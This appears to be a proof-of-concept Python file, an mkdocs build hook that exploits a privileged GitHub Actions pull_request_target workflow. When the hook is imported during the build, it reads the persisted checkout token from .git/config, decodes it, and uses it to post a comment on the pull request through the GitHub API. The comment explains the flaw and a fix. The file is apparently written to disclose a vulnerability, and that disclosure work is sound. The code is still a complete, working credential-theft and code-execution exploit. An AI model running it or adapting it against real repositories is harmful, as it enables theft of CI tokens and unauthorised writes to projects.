"""Mkdocs hook: pull_request_target PoC.

Loaded by mkdocs because `mkdocs.yml` lists this file under `hooks:`.
Runs during `mkdocs build --strict` in the privileged pull_request_target
workflow run, with the actions/checkout token still persisted in .git/config.
Posts a comment back on the triggering PR to demonstrate write capability.
"""
import base64
import json
import os
import re
import sys
import traceback
import urllib.request


def _log(msg):
    print(f"[poc] {msg}", file=sys.stderr, flush=True)


def _exploit():
    workspace = os.environ.get("GITHUB_WORKSPACE")
    event_path = os.environ.get("GITHUB_EVENT_PATH")
    repo = os.environ.get("GITHUB_REPOSITORY")
    run_id = os.environ.get("GITHUB_RUN_ID", "?")
    if not (workspace and event_path and repo):
        _log("missing required env; bailing")
        return

    cfg = open(os.path.join(workspace, ".git", "config")).read()
    m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", cfg)
    if not m:
        _log("no extraheader token; bailing")
        return
    decoded = base64.b64decode(m.group(1)).decode("utf-8", "replace")
    _, _, token = decoded.partition(":")
    _log(f"token len={len(token)} prefix={token[:4]}")

    event = json.load(open(event_path))
    pr_num = event["pull_request"]["number"]
    pr_user = event["pull_request"]["user"]["login"]

    body = (
        "**PoC: pull_request_target RCE via mkdocs hook**\n\n"
        f"This comment was posted from `poc_hook.py` while `mkdocs build "
        f"--strict` was running inside `pr_wiki_validation.yml` "
        f"(run #{run_id}).\n\n"
        f"The workflow checks out PR head (`{pr_user}`'s code) and runs "
        f"mkdocs with a PR-controlled `mkdocs.yml`. mkdocs `hooks:` "
        f"directive imports arbitrary Python files from the PR. The "
        f"persisted `GITHUB_TOKEN` is still in `.git/config` and has "
        f"`issues: write`, so any fork PR can post comments / leak the token.\n\n"
        "Fix: switch to `pull_request` (no write token to fork code), or "
        "split into an unprivileged build job + a privileged commenter job."
    )
    url = f"https://api.github.com/repos/{repo}/issues/{pr_num}/comments"
    req = urllib.request.Request(
        url,
        data=json.dumps({"body": body}).encode(),
        method="POST",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "prt-poc",
        },
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        _log(f"comment POST status={r.status}")


try:
    _exploit()
except Exception:
    traceback.print_exc()


def on_config(config, **kwargs):
    return config
